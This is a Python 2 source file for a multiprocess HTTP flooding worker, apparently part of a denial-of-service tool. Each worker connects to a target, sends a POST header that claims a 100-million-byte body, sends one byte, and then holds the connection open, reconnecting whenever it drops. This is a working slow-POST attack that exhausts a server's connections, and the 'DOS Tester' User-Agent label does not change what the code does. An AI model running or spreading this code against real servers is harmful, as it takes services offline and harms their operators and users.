import socket, time
from Functions import *
from multiprocessing import Process

# Thanks to _entropy

class HTTPWorkerThread(Process):

    def __init__(self, flooder, id):
        Process.__init__(self)
        self.id = id
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
        self.socket.setblocking(1)

        self.host = flooder.host
        self.port = flooder.port
        self.running = True
        self.floodCount = 0

        if flooder.random:
            self.message = randomString(256)
        else:
            self.message = self.flooder.message

        print "initialized http thread"

    def stop(self):
        self.running = False

    def sendHTTPHeader(self):
        self.socket.send("POST / HTTP/1.1\r\n"
                          "Host: %s\r\n"
                          "User-Agent: XPN HTTP DOS Tester\r\n"
                          "Connection: keep-alive\r\n"
                          "Keep-Alive: 900\r\n"
                          "Content-Length: 100000000\r\n"
                          "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % (self.host))
        #print "thread", self.id, "send header"

    def run(self):
        try:
            while self.running:
                while self.running:
                    try:
                        self.socket.connect((self.host, self.port))
                        #print "thread", self.id, "connected"
                        break
                    except Exception, e:
                        if e.args[0] == 106 or e.args[0] == 60:
                            break
                        #print "Couldn't connect:", e.args, self.host, self.port
                        time.sleep(1)
                        continue
                    break

                try:
                    self.sendHTTPHeader()
                    self.socket.send("X")
                    while self.running:
                        time.sleep(1)
                except Exception, e:
                    if e.args[0] == 32 or e.args[0] == 104:
                        #print "thread", self.id ,"connection broken, retrying."
                        self.socket = socket.socket()
                    #print "Couldn't send message on thread", self.id, "because", e.args
                    time.sleep(0.1)
                    pass
        except KeyboardInterrupt:
            return
